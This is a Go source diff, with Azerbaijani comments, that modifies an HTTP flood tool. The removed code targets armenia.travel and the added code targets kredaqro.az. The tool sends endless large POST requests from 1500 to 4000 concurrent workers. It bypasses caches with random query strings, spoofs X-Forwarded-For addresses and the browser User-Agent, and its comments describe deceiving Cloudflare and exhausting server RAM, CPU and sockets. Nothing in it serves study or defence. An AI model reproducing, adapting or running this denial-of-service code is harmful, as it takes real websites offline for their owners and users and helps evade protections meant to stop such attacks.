@@ -8,77 +8,52 @@ import (
 	"strings"
 	"sync"
 	"time"
-	"sync/atomic"
 )
 
 func main() {
-	target := "https://armenia.travel/#"
-	// Railway resurslarını sona qədər istifadə etmək üçün thread sayını artırırıq
-	workers := 4000 
+	target := "kredaqro.az"
+	workers := 1500 // Railway limitinə yaxın maksimum güc
 	
-	fmt.Printf("[!!!] HAKAI-SUPERCELL AKTİVDİR: %s\n", target)
+	fmt.Printf("[!!!] HAKAI-FORCE DEVRƏDƏ: %s\n", target)
 
 	tr := &http.Transport{
-		TLSClientConfig: &tls.Config{
-			InsecureSkipVerify: true,
-			// Müasir brauzer TLS barmaq izi (JA3) təqlidi
-			MinVersion: tls.VersionTLS12,
-			MaxVersion: tls.VersionTLS13,
-		},
-		MaxIdleConns:        50000,
-		MaxIdleConnsPerHost: 25000,
-		// Bağlantıları açıq saxlayaraq serverin socket limitini doldururuq
-		DisableKeepAlives: false, 
-		IdleConnTimeout:   90 * time.Second,
+		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
+		MaxIdleConns: 10000,
+		MaxIdleConnsPerHost: 5000,
 	}
 
-	client := &http.Client{Transport: tr, Timeout: 5 * time.Second}
-	var crashCount uint64
+	client := &http.Client{Transport: tr, Timeout: 10 * time.Second}
 
 	var wg sync.WaitGroup
 	for i := 0; i < workers; i++ {
 		wg.Add(1)
 		go func(id int) {
 			defer wg.Done()
-			// Serverin CPU-sunu 100% yükə salacaq daha böyük payload
-			payload := "x=" + strings.Repeat("Z", 256000) // 256KB hər müraciətdə
+			// Serverin RAM-ını doldurmaq üçün ağır payload
+			payload := "data=" + strings.Repeat("X", 65536) // 64KB hər sorğuda
 			
 			for {
-				// Cache bypass - server hər sorğunu yeni sorğu kimi emal etməlidir
-				u := fmt.Sprintf("%s?v=%d&q=%d", target, time.Now().UnixNano(), rand.Int())
+				u := fmt.Sprintf("%s/?bypass=%d&t=%d", target, rand.Intn(999999), time.Now().UnixNano())
 				
+				// POST sorğusu heç vaxt keşlənməz, birbaşa beyninə gedir
 				req, _ := http.NewRequest("POST", u, strings.NewReader(payload))
 				
-				// Cloudflare-i "bu real insandır" deyə aldatmaq üçün başlıqlar
-				req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/122.0.0.0")
+				req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/119.0.0.0")
 				req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
 				req.Header.Set("Cache-Control", "no-cache, no-store, must-revalidate")
-				req.Header.Set("Connection", "keep-alive")
-				req.Header.Set("X-Requested-With", "XMLHttpRequest")
+				req.Header.Set("X-Forwarded-For", fmt.Sprintf("%d.%d.%d.%d", rand.Intn(255), rand.Intn(255), rand.Intn(255), rand.Intn(255)))
 
 				resp, err := client.Do(req)
 				if err == nil {
 					if resp.StatusCode >= 500 {
-						atomic.AddUint64(&crashCount, 1)
+						fmt.Printf("[WIN-%d] SERVER CRASHED: %d\n", id, resp.StatusCode)
 					}
-					// Body-ni dərhal bağlamırıq ki, socket bir müddət məşğul qalsın
-					time.Sleep(100 * time.Millisecond)
 					resp.Body.Close()
-				} else {
-					// Əgər timeout və ya connection refused olursa, server artıq "ölüdür"
-					atomic.AddUint64(&crashCount, 1)
 				}
+				// Cloudflare blokuna düşməmək üçün çox kiçik fasilə
+				time.Sleep(5 * time.Millisecond)
 			}
 		}(i)
 	}
-
-	// Status Hesabatı (Railway loglarını doldurmadan)
-	go func() {
-		for {
-			time.Sleep(3 * time.Second)
-			fmt.Printf("[STATUS] Server Çöküş Siqnalları (Error): %d\n", atomic.LoadUint64(&crashCount))
-		}
-	}()
-
 	wg.Wait()
 }
